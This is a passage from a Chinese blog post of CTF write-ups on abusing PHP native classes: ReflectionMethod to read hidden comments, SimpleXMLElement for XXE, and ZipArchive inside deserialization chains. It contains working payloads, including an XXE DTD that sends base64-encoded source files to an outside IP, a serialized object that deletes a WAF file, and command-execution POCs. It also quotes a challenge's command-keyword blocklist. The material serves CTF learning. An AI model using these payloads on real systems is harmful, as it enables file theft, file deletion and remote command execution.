print_r($ref-&gt;getTraitAliases()); // 返回 trait 别名的一个数组
print_r($ref-&gt;getTraitNames()); // 返回 trait 别名的一个数组
print_r($ref-&gt;getTraits()); // 返回这个类所使用的 traits 数组
var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // 检查常量是否已经定义
var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // 检查方法是否已经定义
var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // 检查属性是否已定义
var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // 检查是否实现了某个接口, 注意需要带上命名空间
var_dump($ref-&gt;isAbstract()); // 检查类是否是抽象类（abstract）
var_dump($ref-&gt;isAnonymous()); // 检查类是否是匿名类
var_dump($ref-&gt;isCloneable()); // 返回了一个类是否可复制
var_dump($ref-&gt;isFinal()); // 检查类是否声明为 final
var_dump($ref-&gt;isInstance($obj)); // 检查一个变量是否此类的实例
var_dump($ref-&gt;isInstantiable()); // 检查类是否可实例化
var_dump($ref-&gt;isInterface()); // 检查类是否是一个接口（interface）
var_dump($ref-&gt;isInternal()); // 检查类是否由扩展或核心在内部定义, 和isUserDefined相对
var_dump($ref-&gt;isIterateable()); // 检查此类是否可迭代, 实现了Iterator接口即可迭代
var_dump($ref-&gt;isSubclassOf(A::class)); // 是否是某一个类的子类
var_dump($ref-&gt;isTrait()); // 返回了是否为一个 trait
var_dump($ref-&gt;isUserDefined()); // 检查是否由用户定义的类 和isInternal相对

// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。
// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。
var_dump($ref-&gt;newInstance());
// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。
//这个参数以 array 形式传递到类的构造函数。
var_dump($ref-&gt;newInstanceArgs([]));
var_dump($ref-&gt;newInstanceWithoutConstructor()); // 创建一个新的实例而不调用他的构造函数
$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // 设置静态属性的值, 无返回值
var_dump($ref-&gt;__toString ()); // 返回 ReflectionClass 对象字符串的表示形式。
</code></pre>
<pre><code>### ReflectionMethod API
```php
/*
ReflectionMethod::__construct — ReflectionMethod 的构造函数
ReflectionMethod::export — 输出一个回调方法
ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。
ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例
ReflectionMethod::getModifiers — 获取方法的修饰符
ReflectionMethod::getPrototype — 返回方法原型 (如果存在)
ReflectionMethod::invoke — Invoke
ReflectionMethod::invokeArgs — 带参数执行
ReflectionMethod::isAbstract — 判断方法是否是抽象方法
ReflectionMethod::isConstructor — 判断方法是否是构造方法
ReflectionMethod::isDestructor — 判断方法是否是析构方法
ReflectionMethod::isFinal — 判断方法是否定义 final
ReflectionMethod::isPrivate — 判断方法是否是私有方法
ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected)
ReflectionMethod::isPublic — 判断方法是否是公开方法
ReflectionMethod::isStatic — 判断方法是否是静态方法
ReflectionMethod::setAccessible — 设置方法是否访问
ReflectionMethod::__toString — 返回反射方法对象的字符串表达
*/
ReflectionMethod extends ReflectionFunctionAbstract implements Reflector &#123;
/* 常量 */
const integer IS_STATIC = 1 ;
const integer IS_PUBLIC = 256 ;
const integer IS_PROTECTED = 512 ;
const integer IS_PRIVATE = 1024 ;
const integer IS_ABSTRACT = 2 ;
const integer IS_FINAL = 4 ;
/* 属性 */
public $name ;
public $class ;
/* 方法 */
public __construct ( mixed $class , string $name )
public static export ( string $class , string $name [, bool $return = false ] ) : string
public getClosure ( object $object ) : Closure
public getDeclaringClass ( ) : ReflectionClass
public getModifiers ( ) : int
public getPrototype ( ) : ReflectionMethod
public invoke ( object $object [, mixed $parameter [, mixed $... ]] ) : mixed
public invokeArgs ( object $object , array $args ) : mixed
public isAbstract ( ) : bool
public isConstructor ( ) : bool
public isDestructor ( ) : bool
public isFinal ( ) : bool
public isPrivate ( ) : bool
public isProtected ( ) : bool
public isPublic ( ) : bool
public isStatic ( ) : bool
public setAccessible ( bool $accessible ) : void
public __toString ( ) : string
/* 继承的方法 */
final private ReflectionFunctionAbstract::__clone ( ) : void
public ReflectionFunctionAbstract::getClosureScopeClass ( ) : ReflectionClass
public ReflectionFunctionAbstract::getClosureThis ( ) : object
public ReflectionFunctionAbstract::getDocComment ( ) : string
public ReflectionFunctionAbstract::getEndLine ( ) : int
public ReflectionFunctionAbstract::getExtension ( ) : ReflectionExtension
public ReflectionFunctionAbstract::getExtensionName ( ) : string
public ReflectionFunctionAbstract::getFileName ( ) : string
public ReflectionFunctionAbstract::getName ( ) : string
public ReflectionFunctionAbstract::getNamespaceName ( ) : string
public ReflectionFunctionAbstract::getNumberOfParameters ( ) : int
public ReflectionFunctionAbstract::getNumberOfRequiredParameters ( ) : int
public ReflectionFunctionAbstract::getParameters ( ) : array
public ReflectionFunctionAbstract::getReturnType ( ) : ReflectionType
public ReflectionFunctionAbstract::getShortName ( ) : string
public ReflectionFunctionAbstract::getStartLine ( ) : int
public ReflectionFunctionAbstract::getStaticVariables ( ) : array
public ReflectionFunctionAbstract::hasReturnType ( ) : bool
public ReflectionFunctionAbstract::inNamespace ( ) : bool
public ReflectionFunctionAbstract::isClosure ( ) : bool
public ReflectionFunctionAbstract::isDeprecated ( ) : bool
public ReflectionFunctionAbstract::isGenerator ( ) : bool
public ReflectionFunctionAbstract::isInternal ( ) : bool
public ReflectionFunctionAbstract::isUserDefined ( ) : bool
public ReflectionFunctionAbstract::isVariadic ( ) : bool
public ReflectionFunctionAbstract::returnsReference ( ) : bool
abstract public ReflectionFunctionAbstract::__toString ( ) : void
&#125;
</code></pre>
<h2 id="第十四届全国信息安全竞赛-easy-resource"><a href="#第十四届全国信息安全竞赛-easy-resource" class="headerlink" title="[第十四届全国信息安全竞赛]easy_resource"></a>[第十四届全国信息安全竞赛]easy_resource</h2><p><strong>目录扫描可获得源码:</strong></p>
<pre><code class="php">&lt;?php
class User
&#123;
    private static $c = 0;

    function a()
    &#123;
        return ++self::$c;
    &#125;

    function b()
    &#123;
        return ++self::$c;
    &#125;

    function c()
    &#123;
        return ++self::$c;
    &#125;

    function d()
    &#123;
        return ++self::$c;
    &#125;

    function e()
    &#123;
        return ++self::$c;
    &#125;

    function f()
    &#123;
        return ++self::$c;
    &#125;

    function g()
    &#123;
        return ++self::$c;
    &#125;

    function h()
    &#123;
        return ++self::$c;
    &#125;

    function i()
    &#123;
        return ++self::$c;
    &#125;

    function j()
    &#123;
        return ++self::$c;
    &#125;

    function k()
    &#123;
        return ++self::$c;
    &#125;

    function l()
    &#123;
        return ++self::$c;
    &#125;

    function m()
    &#123;
        return ++self::$c;
    &#125;

    function n()
    &#123;
        return ++self::$c;
    &#125;

    function o()
    &#123;
        return ++self::$c;
    &#125;

    function p()
    &#123;
        return ++self::$c;
    &#125;

    function q()
    &#123;
        return ++self::$c;
    &#125;

    function r()
    &#123;
        return ++self::$c;
    &#125;

    function s()
    &#123;
        return ++self::$c;
    &#125;

    function t()
    &#123;
        return ++self::$c;
    &#125;

&#125;



$rc=$_GET[&quot;rc&quot;];
$rb=$_GET[&quot;rb&quot;];
$ra=$_GET[&quot;ra&quot;];
$rd=$_GET[&quot;rd&quot;];
$method= new $rc($ra, $rb);
var_dump($method-&gt;$rd());
</code></pre>
<p>可利用原生的反射类进行读取，题目说在看不到的地方，猜测是在注释的地方<br>可构造payload:</p>
<pre><code class="php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment
</code></pre>
<p>翻译一下就是:</p>
<pre><code class="php">$method = new ReflectionMethod(User,a);
var_dump($method-&gt;getDocComment); //getDocComment获取文档注释
</code></pre>
<p>由于不知道是在哪个方法内，所以可以进行遍历<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665485044657-d5e28374-5468-4f38-a96b-d076e14ca3f9.png" alt="image.png"></p>
<h1 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h1><p> SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。  </p>
<h2 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h2><p> 官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665487834374-89b18cf7-62f3-4f6d-8772-86dcad3bdbbd.png" alt="t01f512315ecae4f8e3.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665487841658-6b4bb837-d7b0-40a2-8dd4-58841f416edb.png" alt="t017279b3b019174cb6.png"><br>可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。<br>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
<h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><p>随便注册一个账户发现如下源码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665933717474-8039a055-da9e-450d-b80a-9cf05791eb7f.png" alt="image.png"></p>
<pre><code class="php">&lt;?php 
class calc&#123;
    function __construct__()&#123;
        calc();
    &#125;

    function calc($args1,$method,$args2)&#123;
        $args1=intval($args1);
        $args2=intval($args2);
        switch ($method) &#123;
            case &#39;a&#39;:
                $method=&quot;+&quot;;
                break;

            case &#39;b&#39;:
                $method=&quot;-&quot;;
                break;

            case &#39;c&#39;:
                $method=&quot;*&quot;;
                break;

            case &#39;d&#39;:
                $method=&quot;/&quot;;
                break;
            
            default:
                die(&quot;invalid input&quot;);
        &#125;
        $Expression=$args1.$method.$args2;
        eval(&quot;\$r=$Expression;&quot;);
        die(&quot;Calculation results:&quot;.$r);
    &#125;
&#125;
?&gt;        
</code></pre>
<p> <img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665933869850-f292420e-807a-4315-9ae4-97d12651944b.png" alt="image.png"><br>我们可以利用SimpleXMLElement类<br>我们构造的xml如下:<br>test.xml</p>
<pre><code class="php">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE try[
&lt;!ENTITY % int SYSTEM &quot;http://108.166.201.16:8000/evil.dtd&quot;&gt;
%int;
%all;
%send;
]&gt;
</code></pre>
<p>evil.dtd</p>
<pre><code class="php">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://108.166.201.16:5555/?%payl;&#39;&gt;&quot;&gt;
</code></pre>
<p>在vps上放上这两个文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665934117600-563713ba-7b9f-40ba-9e24-4b49b463c64a.png" alt="image.png"><br>然后再使用vps监听5555端口<br>最终构造payload</p>
<pre><code class="php">http://16c35a6e-0285-4dc1-9c3d-2acf598489fc.node4.buuoj.cn:81/show.php?module=SimpleXMLElement&amp;args[]=http://108.166.201.16:8000/test.xml&amp;args[]=2&amp;args[]=true
</code></pre>
<p>我们可以看到接受到了数据，base64解码即可<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665934164637-826456e2-a39d-499b-96c6-528cbaa8a0f9.png" alt="image.png"><br>同理可获得其他页面源码</p>
<h1 id="使用-ZipArchive-类来删除文件"><a href="#使用-ZipArchive-类来删除文件" class="headerlink" title="使用 ZipArchive 类来删除文件"></a>使用 ZipArchive 类来删除文件</h1><h2 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h2><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。<br>下面列举几个常见的类方法：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ziparchive.addemptydir.php">ZipArchive::addEmptyDir</a>：添加一个新的文件目录</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ziparchive.addfile.php">ZipArchive::addFile</a>：将文件添加到指定zip压缩包中</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ziparchive.addfromstring.php">ZipArchive::addFromString</a>：添加新的文件同时将内容添加进去</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ziparchive.close.php">ZipArchive::close</a>：关闭ziparchive</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ziparchive.extractto.php">ZipArchive::extractTo</a>：将压缩包解压</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>：打开一个zip压缩包</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ziparchive.deleteindex.php">ZipArchive::deleteIndex</a>：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ziparchive.deletename.php">ZipArchive::deleteName</a>：删除压缩包中的某一个文件名称，同时也将文件删除</li>
<li>……</li>
</ul>
<p>我们来重点看看 ZipArchive::open 方法：</p>
<pre><code class="php">ZipArchive::open(string $filename, int $flags=0)
</code></pre>
<p>该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</p>
<ul>
<li>filename：要打开的ZIP存档的文件名。</li>
<li>flags：用于打开档案的模式。有以下几种模式： <ul>
<li>ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li>
<li>ZipArchive::CREATE：如果不存在则创建一个zip压缩包。</li>
<li>ZipArchive::RDONLY：只读模式打开压缩包。</li>
<li>ZipArchive::EXCL：如果压缩包已经存在，则出错。</li>
<li>ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。</li>
</ul>
</li>
</ul>
<p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。<br>也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。下面我们来看一道CTF题目。</p>
<h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><p>源码下载:<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip">https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip</a></p>
<pre><code class="php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&#39;shell.php&#39;);
class Game&#123;
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;
    
    public function __construct()
    &#123;
        $this-&gt;username=&#39;user&#39;;
        $this-&gt;password=&#39;user&#39;;
    &#125;

    public function __wakeup()&#123;
        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;
            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);
        &#125;else&#123;
            $this-&gt;choice = new register();
        &#125;
    &#125;
    public function __destruct() &#123;
        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);
    &#125;

&#125;
class login&#123;
    public $file;
    public $filename;
    public $content;

    public function __construct($file,$filename,$content)
    &#123;
        $this-&gt;file=$file;
        $this-&gt;filename=$filename;
        $this-&gt;content=$content;
    &#125;
    public function checking($username,$password)
    &#123;
        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;
            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);
            die(&#39;login success you can to open shell file!&#39;);
        &#125;
    &#125;
&#125;
class register&#123;
    public function checking($username,$password)
    &#123;
        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;
            die(&#39;success register admin&#39;);
        &#125;else&#123;
            die(&#39;please register admin &#39;);
        &#125;
    &#125;
&#125;
class Open&#123;
    function open($filename, $content)&#123;
        if(!file_get_contents(&#39;waf.txt&#39;))&#123;
            shell($content);
        &#125;else&#123;
            echo file_get_contents($filename.&quot;.php&quot;);
        &#125;
    &#125;
&#125;
if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;])))&#123;
    @unserialize(base64_decode($_POST[&#39;unser&#39;]));
&#125;
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666010658741-eba5b190-5be1-4994-982d-2c2109ed09eb.png" alt="image.png"><br>这里反序列化前有个校验，直接使用数组绕过</p>
<pre><code class="php">http://127.0.0.1/test/?a[]=1&amp;b[]=2
</code></pre>
<p>读取下shell.php的内容<br>构造payload:</p>
<pre><code class="php">&lt;?php
class Open&#123;
&#125;
class Game&#123;
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;

    public function __construct()
    &#123;
        $this-&gt;username=&#39;user&#39;;
        $this-&gt;password=&#39;user&#39;;
    &#125;

    public function __wakeup()&#123;
        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;
            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);
        &#125;else&#123;
            $this-&gt;choice = new register();
        &#125;
    &#125;
    public function __destruct() &#123;
        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);
    &#125;

&#125;
$a = new Game();
$a-&gt;username = &#39;admin&#39;;
$a-&gt;password = &#39;admin&#39;;
$a-&gt;register = &#39;admin&#39;;
$a-&gt;file=&#39;123&#39;;
$a-&gt;content = &#39;whoami&#39;;
$a-&gt;filename = &#39;php://filter/read=convert.base64-encode/resource=shell&#39;;
$a-&gt;file = new Open();
echo base64_encode(serialize($a));
</code></pre>
<p>解码得到shell.php的源码:</p>
<pre><code class="php">&lt;?php
function shell($cmd)&#123;
    if(strlen($cmd)&lt;10)&#123;
        if(preg_match(&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;,$cmd))&#123;
            die(&quot;NO&quot;);
        &#125;else&#123;
            return system($cmd);
        &#125;
    &#125;else&#123;
        die(&#39;so long!&#39;); 
    &#125;
&#125;
</code></pre>
<p>shell.php可以执行系统命令<br>但是如果要执行shell.php<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666010871391-7c2b5910-4f40-4616-8ff1-6e6309df9a70.png" alt="image.png"><br>必须不存在这个文件，那么我们就要想办法把它删除<br>我们必须要使用原生类，这个原生类还必须是open方法可以删除文件<br>遍历一下:</p>
<pre><code class="php">&lt;?php
$classes = get_declared_classes();
foreach ($classes as $class) &#123;
    $methods = get_class_methods($class);
    foreach ($methods as $method) &#123;
        if (in_array($method, array(
            &#39;open&#39;
        ))) &#123;
            print $class . &#39;::&#39; . $method . &quot;\n&quot;;
        &#125;
    &#125;
&#125;
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666011335328-c952daa5-ae18-4e62-9460-028443cb42c0.png" alt="image.png"><br>ZipArchive刚好有个open方法可以满足,上文已经介绍过了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666011423047-bc1ad514-77ec-4e4b-b46b-633575e9e46f.png" alt="image.png"><br>传入8相当于重写文件<br>最终构造poc:</p>
<pre><code class="php">&lt;?php
class Open&#123;
&#125;
class Game&#123;
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;

    public function __construct()
    &#123;
        $this-&gt;username=&#39;user&#39;;
        $this-&gt;password=&#39;user&#39;;
    &#125;

    public function __wakeup()&#123;
        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;
            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);
        &#125;else&#123;
            $this-&gt;choice = new register();
        &#125;
    &#125;
    public function __destruct() &#123;
        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);
    &#125;

&#125;
$a = new Game();
$a-&gt;username = &#39;admin&#39;;
$a-&gt;password = &#39;admin&#39;;
$a-&gt;register = &#39;admin&#39;;
$a-&gt;file=&#39;123&#39;;
$a-&gt;content = 8;
$a-&gt;filename = &#39;waf.txt&#39;;
$a-&gt;file = new ZipArchive();
echo base64_encode(serialize($a));
</code></pre>
<pre><code class="php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=
</code></pre>
<p>传入后waf.txt就被删除，我这里是本地搭建的环境所以直接可以看到<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666012203141-9ea79c5d-767c-451e-8f16-60826fb1108f.png" alt="image.png"><br>接下来构造poc执行命令即可:</p>
<pre><code class="php">&lt;?php
class Open&#123;
&#125;
class Game&#123;
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;

    public function __construct()
    &#123;
        $this-&gt;username=&#39;user&#39;;
        $this-&gt;password=&#39;user&#39;;
    &#125;

    public function __wakeup()&#123;
        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;
            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);
        &#125;else&#123;
            $this-&gt;choice = new register();
        &#125;
    &#125;
    public function __destruct() &#123;
        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);
    &#125;

&#125;
$a = new Game();
$a-&gt;username = &#39;admin&#39;;
$a-&gt;password = &#39;admin&#39;;
$a-&gt;register = &#39;admin&#39;;
$a-&gt;file=&#39;123&#39;;
$a-&gt;content = &#39;type flag&#39;;
$a-&gt;filename = &#39;111&#39;;
$a-&gt;file = new Open();
echo base64_encode(serialize($a));
</code></pre>
<p>我这里是用windows系统复现的，所以使用命令不同，思路都一样<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1666012717080-da919474-bae9-47a8-978b-cd5b2e4b94a1.png" alt="image.png"></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rawrecruit/article/details/123968687">https://blog.csdn.net/rawrecruit/article/details/123968687</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a><br><a target="_blank" rel="noopener" href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/">https://sakurahack-y.github.io/2022/11/20/php原生类学习/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/php/">php</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%90%84%E6%96%B9%E6%B3%95%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">查看各方法内置类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Error-Exception%E5%86%85%E7%BD%AE%E7%B1%BB%E8%BF%9B%E8%A1%8CXSS"><span class="toc-number">2.</span> <span class="toc-text">利用Error&#x2F;Exception内置类进行XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">Error类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exception%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">Exception类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-xss%E4%B9%8B%E5%85%89"><span class="toc-number">2.3.</span> <span class="toc-text">[BJDCTF 2nd]xss之光</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Error-Exception-%E5%86%85%E7%BD%AE%E7%B1%BB%E7%BB%95%E8%BF%87%E5%93%88%E5%B8%8C%E6%AF%94%E8%BE%83"><span class="toc-number">3.</span> <span class="toc-text">利用Error&#x2F;Exception 内置类绕过哈希比较</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Greatphp"><span class="toc-number">3.1.</span> <span class="toc-text">[2020 极客大挑战]Greatphp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%AF%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">可遍历目录类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Directorylterator"><span class="toc-number">4.1.</span> <span class="toc-text">Directorylterator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filesystemlterator"><span class="toc-number">4.2.</span> <span class="toc-text">Filesystemlterator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SplFileObject"><span class="toc-number">4.3.</span> <span class="toc-text">SplFileObject</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4open-basedir%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">5.</span> <span class="toc-text">突破open_basedir的限制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CCRLF-SSRF"><span class="toc-number">6.</span> <span class="toc-text">利用SoapClient类进行CRLF+SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CRLF"><span class="toc-number">6.1.</span> <span class="toc-text">CRLF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#N1CTF-2018-easy-harder-php"><span class="toc-number">6.2.</span> <span class="toc-text">[N1CTF 2018]easy_harder_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-Upload-Labs-2"><span class="toc-number">6.3.</span> <span class="toc-text">[SUCTF 2019]Upload Labs 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ReflectionMethod%E8%AF%BB%E5%8F%96User%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text">利用ReflectionMethod读取User类的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ReflectionMethod%E7%B1%BB"><span class="toc-number">7.1.</span> <span class="toc-text">ReflectionMethod类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ReflectionClass-API"><span class="toc-number">7.1.1.</span> <span class="toc-text">ReflectionClass API</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-easy-resource"><span class="toc-number">7.2.</span> <span class="toc-text">[第十四届全国信息安全竞赛]easy_resource</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-SimpleXMLElement-%E7%B1%BB%E8%BF%9B%E8%A1%8C-XXE"><span class="toc-number">8.</span> <span class="toc-text">使用 SimpleXMLElement 类进行 XXE</span></a><ol class="toc-child"><li 